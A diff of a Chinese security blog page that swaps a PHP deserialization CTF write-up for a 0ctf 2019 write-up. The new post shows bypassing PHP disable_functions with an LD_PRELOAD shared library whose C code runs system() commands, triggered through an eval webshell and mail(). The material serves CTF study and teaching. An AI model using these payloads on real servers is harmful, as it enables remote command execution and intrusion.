@@ -87,23 +87,25 @@
 
 
 
-<meta name="description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。
-php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
+<meta name="description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。
+0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。
+index.php123456Imag">
 <meta property="og:type" content="article">
-<meta property="og:title" content="php反序列化漏洞利用">
-<meta property="og:url" content="http://yoursite.com/2017/04/09/php反序列化漏洞利用/index.html">
+<meta property="og:title" content="利用LD_PRELOAD绕过disbale_functions">
+<meta property="og:url" content="http://yoursite.com/2019/03/26/利用LD_PRELOAD绕过disbale_functions/index.html">
 <meta property="og:site_name" content="Windylh's blog">
-<meta property="og:description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。
-php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
-<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-1.png">
-<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-2.png">
-<meta property="og:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-3.png">
-<meta property="og:updated_time" content="2018-11-01T10:53:27.456Z">
+<meta property="og:description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。
+0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。
+index.php123456Imag">
+<meta property="og:image" content="http://yoursite.com/web1.png">
+<meta property="og:image" content="http://yoursite.com/web2.png">
+<meta property="og:updated_time" content="2019-03-26T11:13:30.159Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="php反序列化漏洞利用">
-<meta name="twitter:description" content="0x00 unserialize函数讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。
-php官方文档对unserialize()的说明是：unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在">
-<meta name="twitter:image" content="https://github.com/Windylh/image/raw/master/2017.4.9/1-1.png">
+<meta name="twitter:title" content="利用LD_PRELOAD绕过disbale_functions">
+<meta name="twitter:description" content="0x00 0ctf2019-Wallbreaker Easy在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过LD_PRELOAD绕过disbale_functions的方法。学到的东西在这里记录一下。
+0x01 Wallbreaker Easy Writeup首先记录一下这道题的解题过程。
+index.php123456Imag">
+<meta name="twitter:image" content="http://yoursite.com/web1.png">
 
 
 
@@ -131,13 +133,13 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/04/09/php反序列化漏洞利用/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/03/26/利用LD_PRELOAD绕过disbale_functions/"/>
 
 
 
 
 
-  <title> php反序列化漏洞利用 | Windylh's blog </title>
+  <title> 利用LD_PRELOAD绕过disbale_functions | Windylh's blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -256,7 +258,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/04/09/php反序列化漏洞利用/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/利用LD_PRELOAD绕过disbale_functions/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Windylh">
@@ -277,7 +279,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
             
             
               
-                php反序列化漏洞利用
+                利用LD_PRELOAD绕过disbale_functions
               
             
           </h1>
@@ -292,8 +294,8 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-09T00:00:00+08:00">
-                2017-04-09
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-26T00:00:00+08:00">
+                2019-03-26
               </time>
             
 
@@ -310,7 +312,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
 
           
           
-             <span id="/2017/04/09/php反序列化漏洞利用/" class="leancloud_visitors" data-flag-title="php反序列化漏洞利用">
+             <span id="/2019/03/26/利用LD_PRELOAD绕过disbale_functions/" class="leancloud_visitors" data-flag-title="利用LD_PRELOAD绕过disbale_functions">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -339,67 +341,35 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
       
 
       
-        <h2 id="0x00-unserialize函数"><a href="#0x00-unserialize函数" class="headerlink" title="0x00 unserialize函数"></a>0x00 unserialize函数</h2><p>讲到php反序列化漏洞首先要提到unserialize函数，这个函数是php反序列化漏洞利用的基础。</p>
-<p>php官方文档对unserialize()的说明是：<strong>unserialize() 对单一的已序列化的变量进行操作，将其转换回 PHP 的值。若被解序列化的变量是一个对象，在成功地重新构造对象之后，PHP 会自动地试图去调用 __wakeup() 成员函数（如果存在的话）。</strong></p>
-<p>这也是我们要去利用的地方。</p>
-<a id="more"></a>
-<h2 id="0x01-理解序列化的字符串"><a href="#0x01-理解序列化的字符串" class="headerlink" title="0x01 理解序列化的字符串"></a>0x01 理解序列化的字符串</h2><p>要学习反序列化漏洞，还要明白序列化后的字符串的意义，方便我们构造payload。</p>
-<p>例如：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"> <span class="class"><span class="keyword">class</span> <span class="title">foo</span></span>&#123;</div><div class="line">    <span class="keyword">public</span> $filename=<span class="string">'233.txt'</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line">$a = <span class="keyword">new</span> foo();</div><div class="line"><span class="keyword">echo</span> $a-&gt;filename.<span class="string">'&lt;br /&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> serialize($a);</div></pre></td></tr></table></figure></p>
-<p>运行这个php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">233.txt</div><div class="line">O:3:&quot;foo&quot;:1:&#123;s:8:&quot;filename&quot;;s:7:&quot;233.txt&quot;;&#125;</div></pre></td></tr></table></figure></p>
-<p>第二行就是我们序列化之后的内容，我们来分析一下</p>
-<blockquote>
-<p>O：对象，对象名长度为3，名字为“foo”，有一个参数。</p>
-<p>s：字符串，长度为8，变量名字符串为“filename”</p>
-</blockquote>
-<p>我们执行序列化之后可以将类，数组等压缩到一起。</p>
-<blockquote>
-<p>注：a表示数组，i表示integer</p>
-</blockquote>
-<h2 id="0x02-php反序列化漏洞"><a href="#0x02-php反序列化漏洞" class="headerlink" title="0x02 php反序列化漏洞"></a>0x02 php反序列化漏洞</h2><p>php反序列化漏洞又称对象注入，可能会导致远程代码执行(RCE)</p>
-<p>反序列化漏洞的执行过程就是通过可控的unserialze函数，构造一个类，调用这个类并执行魔术方法，然后执行类中的函数，达到攻击目的。</p>
-<p>所以要利用反序列化必须满足两个条件：</p>
-<blockquote>
-<p>1、应用程序中必须有一个实现某种php魔术方法的类，可用于执行恶意攻击。</p>
-<p>2、当调用脆弱的unserialize()时，必须声明攻击期间所使用的所有类，否则必须支持此类的对象自动加载。</p>
-</blockquote>
-<h2 id="魔术方法："><a href="#魔术方法：" class="headerlink" title="魔术方法："></a>魔术方法：</h2><p>魔术方法不需要调用就可以执行。<br>常见的魔术方法如下：</p>
-<blockquote>
-<p>__construct() 类的构造函数</p>
-<p>__destruct() 类的析构函数</p>
-<p>__call() 在对象中调用一个不可访问方法时调用</p>
-<p>__callStatic() 用静态方式中调用一个不可访问方法时调用</p>
-<p>__get() 获得一个类的成员变量时调用</p>
-<p>__set() 设置一个类的成员变量时调用</p>
-<p>__isset() 当对不可访问属性调用isset()或empty()时调用</p>
-<p>__unset() 当对不可访问属性调用unset()时被调用</p>
-<p>__sleep() 执行serialize()时，先会调用这个函数</p>
-<p>__wakeup() 执行unserialize()时，先会调用这个函数</p>
-<p>__toString() 类被当成字符串时的回应方法</p>
-<p>__invoke() 调用函数的方式调用一个对象时的回应方法</p>
-<p>__set_state() 调用var_export()导出类时，此静态方法会被调用</p>
-<p>__clone() 当对象复制完成时调用</p>
-<p>__debugInfo() 打印所需调试信息</p>
-<p>__autoload() 尝试加载未定义的类</p>
-</blockquote>
-<h2 id="0x03-实战"><a href="#0x03-实战" class="headerlink" title="0x03 实战"></a>0x03 实战</h2><p>HBctf中有一道综合性的web题，最后的部分刚好是反序列化。</p>
-<p>查看源码：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">you are not admin ! </div><div class="line">&lt;!--</div><div class="line">$user = $_GET[<span class="string">"user"</span>];</div><div class="line">$file = $_GET[<span class="string">"file"</span>];</div><div class="line">$pass = $_GET[<span class="string">"pass"</span>];</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"> --&gt;</div></pre></td></tr></table></figure></p>
-<p>直接在get中构造赋值并没有用。</p>
-<p>想到了php的伪协议 <code>php：//input</code>，同时post数据<code>the user is admin</code><br><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-1.png" alt="1-1"><br>第一步绕过，到了<code>include($file); //class.php</code>，提示我读取class.php</p>
-<p>可以运用伪协议<code>php://filter</code>读取文件</p>
-<p>利用方法：<code>php://filter/convert.base64-encode/resource=xxxxx.php</code><br><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-2.png" alt="1-2"><br>得到base64编码后的class.php,解密得：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></div><div class="line">    <span class="keyword">public</span> $file;</div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</div><div class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<p>这里定义了一个Read类，有魔术方法__toString。</p>
-<p>然后我用php伪协议读取了一下index.php，真正的源码如下</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment"># index.php</span></div><div class="line">$user = <span class="keyword">isset</span>($_GET[<span class="string">'user'</span>])?$_GET[<span class="string">"user"</span>]:<span class="string">""</span>;</div><div class="line">$file = <span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])?$_GET[<span class="string">"file"</span>]:<span class="string">"class.php"</span>;</div><div class="line">$pass = <span class="keyword">isset</span>($_GET[<span class="string">"pass"</span>])?$_GET[<span class="string">"pass"</span>]:<span class="string">""</span>;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"the user is admin"</span>))&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;</div><div class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/f1a9/"</span>,$file))&#123;</div><div class="line">        <span class="keyword">exit</span>();</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">include</span>($file); <span class="comment">//class.php</span></div><div class="line">        $pass = unserialize($pass);</div><div class="line">        <span class="keyword">echo</span> $pass;</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>有unserialize()，有class类和魔术方法__toString()，我们就可以进行反序列化攻击了。</p>
-<p>构造：<code>O:4:&quot;Read&quot;:1:{s:4:&quot;file&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=f1a9.php&quot;;}</code></p>
-<p><img src="https://github.com/Windylh/image/raw/master/2017.4.9/1-3.png" alt="1-3"></p>
-<p>解base64编码，得到flag。</p>
-<p>bugku中的一个题与这个类似，有兴趣的可以去尝试一下</p>
-<p><a href="http://120.24.86.145:8006/test1/" target="_blank" rel="external">http://120.24.86.145:8006/test1/index.php</a></p>
-<h2 id="0x04-如何防御php反序列化漏洞"><a href="#0x04-如何防御php反序列化漏洞" class="headerlink" title="0x04 如何防御php反序列化漏洞"></a>0x04 如何防御php反序列化漏洞</h2><p>防御php反序列化漏洞很简单。</p>
-<blockquote>
-<p>1、对参数进行过滤转义处理。</p>
-<p>2、换用更安全的函数。</p>
+        <h2 id="0x00-0ctf2019-Wallbreaker-Easy"><a href="#0x00-0ctf2019-Wallbreaker-Easy" class="headerlink" title="0x00 0ctf2019-Wallbreaker Easy"></a>0x00 0ctf2019-Wallbreaker Easy</h2><p>在刚刚结束的0ctf中有一个Web题，提供了webshell，但是禁用了执行命令的函数。在查询资料的时候知道了可以通过<code>LD_PRELOAD</code>绕过<code>disbale_functions</code>的方法。学到的东西在这里记录一下。</p>
+<h2 id="0x01-Wallbreaker-Easy-Writeup"><a href="#0x01-Wallbreaker-Easy-Writeup" class="headerlink" title="0x01 Wallbreaker Easy Writeup"></a>0x01 Wallbreaker Easy Writeup</h2><p>首先记录一下这道题的解题过程。</p>
+<p>index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">Imagick is a awesome library for hackers to break `disable_functions`.</div><div class="line">So I installed php-imagick in the server, opened a `backdoor` for you.</div><div class="line">Let&apos;s try to execute `/readflag` to get the flag.</div><div class="line">Open basedir: /var/www/html:/tmp/415c92e8be7c68409ca6bd369d87482f</div><div class="line">Hint: eval($_POST[&quot;backdoor&quot;]);</div></pre></td></tr></table></figure></p>
+<p>index.php就是一句话木马，密码是<code>backdoor</code>。提示我们用<code>Imagick</code>插件绕过<code>disable_functions</code>，执行<code>/readflag</code>来获得flag。并给出了<code>open basedir</code>。</p>
+<p>首先查看一下<code>disable_functions</code>。payload:<code>backdoor=echo ini_get(&#39;disable_functions&#39;);</code></p>
+<p>除了默认设置禁用的pcntl的一系列函数还禁用了<code>system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail</code>。</p>
+<p>一开始去找了<code>Imagick</code>插件的漏洞，但都在当前版本中被修复了。之后看到了<code>LD_PRELOAD</code>利用<code>mail()</code>函数绕过<code>disable_functions</code>的方法。和<code>Imagick</code>结合，成功拿到了flag。</p>
+<h2 id="0x02-Sendmail-LD-PRELOAD绕过disable-functions"><a href="#0x02-Sendmail-LD-PRELOAD绕过disable-functions" class="headerlink" title="0x02 Sendmail+LD_PRELOAD绕过disable_functions"></a>0x02 Sendmail+LD_PRELOAD绕过disable_functions</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在 UNIX 的动态链接库的世界中，LD_PRELOAD 是一个有趣的环境变量，它可以影响程序运行时的链接，它允许你定义在程序运行前优先加载的动态链接库。</div></pre></td></tr></table></figure>
+<p>当程序运行时需要调用系统共享对象中的函数时，我们可以通过设置<code>LD_PRELOAD</code>来优先加载我们编写的恶意代码来劫持原本系统共享对象的代码。</p>
+<p>攻击过程：<br>1、生成含有恶意代码的动态链接程序。<br>2、运用<code>putenv</code>来设置<code>LD_PRELOAD</code>，优先调用我们编写的程序。<br>3、通过webshell触发函数。</p>
+<p>很多文章以sendmail为例子。利用<code>readelf -Ws /usr/sbin/sendmail</code>查看其调用的库函数，从中选择了<code>geteuid()</code>函数来劫持。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">geteuid</span> <span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = <span class="string">"ls &gt; /var/www/html/test.txt"</span>;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</div><div class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</div><div class="line">            &#125;</div><div class="line">    &#125;</div><div class="line">    system(cmdline);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>程序运行，共享库的<code>geteuid()</code>被调用时，通过<code>system()</code>执行命令。</p>
+<p>在尽量和服务器相同的环境中将它编译为一个共享对象。</p>
+<p><code>gcc -shared -fPIC exp.c -o exp.so</code></p>
+<p>将<code>.so</code>文件传输到服务器中，运用php代码设置为<code>LD_PRELOAD</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">putenv(<span class="string">"LD_PRELOAD=/var/www/exp.so"</span>);</div><div class="line">mail(<span class="string">"admin@admin.com"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>);</div></pre></td></tr></table></figure>
+<p>此时在/var/www/html/目录下就会产生test.txt。</p>
+<p>因为利用了sendmail调用<code>geteuid()</code>，进行了劫持，所以没有安装sendmail时无法使用这个函数。</p>
+<p>在这道题中，并没有sendmail，也就无法劫持getuid()函数。</p>
+<h3 id="0x03-C-语言扩展修饰符-attribute-constructor"><a href="#0x03-C-语言扩展修饰符-attribute-constructor" class="headerlink" title="0x03 C 语言扩展修饰符 attribute((constructor))"></a>0x03 C 语言扩展修饰符 <strong>attribute</strong>((constructor))</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">GNU C 的一大特色就是__attribute__ 机制。__attribute__ 可以设置函数属性（Function Attribute ）、变量属性（Variable Attribute ）和类型属性（Type Attribute ）。</div><div class="line"></div><div class="line">__attribute__ ((constructor))会使函数在main()函数之前被执行。</div></pre></td></tr></table></figure>
+<p>如果我们在我们的函数之前采用这个修饰符，那么程序在加载系统共享对象的时候会优先执行我们的函数，这样就可以不用对特定的函数进行劫持，直接绕过<code>disable_functions</code>。</p>
+<p>修改后的payload：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</div><div class="line"></div><div class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* cmdline = <span class="string">"/readflag &gt; /tmp/415c92e8be7c68409ca6bd369d87482f/asd"</span>;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; environ[i]; ++i) &#123;</div><div class="line">            <span class="keyword">if</span> (<span class="built_in">strstr</span>(environ[i], <span class="string">"LD_PRELOAD"</span>)) &#123;</div><div class="line">                    environ[i][<span class="number">0</span>] = <span class="string">'\0'</span>;</div><div class="line">            &#125;</div><div class="line">    &#125;</div><div class="line">    system(cmdline);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>同时上传一个doc文件，用Imagick加载。</p>
+<p><img src="web1.png" alt=""></p>
+<p>因为没有了特定函数劫持的限制，只要我们执行mail函数，不管有没有安装sendmail都可以直接绕过<code>disable_functions</code>。</p>
+<p><img src="web2.png" alt=""></p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote>
+<p><a href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html" target="_blank" rel="external">PHP disable_functions Bypass 的方法探究</a><br><a href="https://www.cnblogs.com/hookjoy/p/10167315.html" target="_blank" rel="external">无需sendmail：巧用LD_PRELOAD突破disable_functions</a><br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/bypass_disablefunc.c" target="_blank" rel="external">bypass_disablefunc_via_LD_PRELOAD/bypass_disablefunc.c at master · yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
 </blockquote>
 
       
@@ -445,8 +415,8 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/04/05/XSS漏洞利用姿势/" rel="next" title="XSS漏洞利用姿势">
-                <i class="fa fa-chevron-left"></i> XSS漏洞利用姿势
+              <a href="/2018/12/01/2018鹏城杯Web(部分)Writeup/" rel="next" title="2018鹏城杯myblog&shadow Writeup">
+                <i class="fa fa-chevron-left"></i> 2018鹏城杯myblog&shadow Writeup
               </a>
             
           </div>
@@ -454,10 +424,6 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/04/09/SQL注入练习总结/" rel="prev" title="SQL注入练习题解">
-                SQL注入练习题解 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -636,7 +602,7 @@ php官方文档对unserialize()的说明是：unserialize() 对单一的已序�
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-unserialize函数"><span class="nav-number">1.</span> <span class="nav-text">0x00 unserialize函数</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-理解序列化的字符串"><span class="nav-number">2.</span> <span class="nav-text">0x01 理解序列化的字符串</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-php反序列化漏洞"><span class="nav-number">3.</span> <span class="nav-text">0x02 php反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#魔术方法："><span class="nav-number">4.</span> <span class="nav-text">魔术方法：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-实战"><span class="nav-number">5.</span> <span class="nav-text">0x03 实战</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-如何防御php反序列化漏洞"><span class="nav-number">6.</span> <span class="nav-text">0x04 如何防御php反序列化漏洞</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-0ctf2019-Wallbreaker-Easy"><span class="nav-number">1.</span> <span class="nav-text">0x00 0ctf2019-Wallbreaker Easy</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-Wallbreaker-Easy-Writeup"><span class="nav-number">2.</span> <span class="nav-text">0x01 Wallbreaker Easy Writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-Sendmail-LD-PRELOAD绕过disable-functions"><span class="nav-number">3.</span> <span class="nav-text">0x02 Sendmail+LD_PRELOAD绕过disable_functions</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-C-语言扩展修饰符-attribute-constructor"><span class="nav-number">3.1.</span> <span class="nav-text">0x03 C 语言扩展修饰符 attribute((constructor))</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
             
 
           </div>
